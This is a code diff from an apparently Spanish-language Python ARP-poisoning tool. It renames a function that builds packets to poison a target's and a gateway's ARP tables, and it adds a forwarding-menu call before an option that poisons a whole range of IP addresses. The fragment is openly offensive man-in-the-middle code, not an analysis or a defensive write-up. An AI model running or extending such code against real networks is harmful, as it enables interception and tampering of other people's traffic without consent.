@@ -62,7 +62,7 @@ def arpPoissoningSoloIP(IP_OBJETIVO,IP_GATEWAY):
 	h2=threading.Thread(target=enviarPaquete, args=(p2))
 	h2.start()
 
-def arpPoissoning(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
+def arpPoissoningMAC(IP_OBJETIVO,IP_GATEWAY,mac_propia,mac_objetivo,mac_gateway):
 	#Creamos los paquetes que se enviaran para envenenar las tablas ARP
 	p1=buildPacket(mac_propia,mac_objetivo,IP_GATEWAY,IP_OBJETIVO)
 	p2=buildPacket(mac_propia,mac_gateway,IP_OBJETIVO,IP_GATEWAY)
@@ -139,13 +139,14 @@ def menuGeneral():
 		menu()
 		
 	elif (teclado == 2):
+		menuForwarding()
 		ip_inicio=	raw_input("Introduce la IP inicial \n")
 		ip_fin= raw_input("Introduce la IP final \n")
 		ip_gat= raw_input("Introduce la IP del gateway \n")
 		ipl=ips(ip_inicio,ip_fin)
 		print(ipl)
 		arpPoisoningLista(ipl,ip_gat)
-		#listaIP=ipRange(ip_inicio,ip_fin)
+	
 	else:
 		print("Opcion no valida")
 		time.sleep(2)
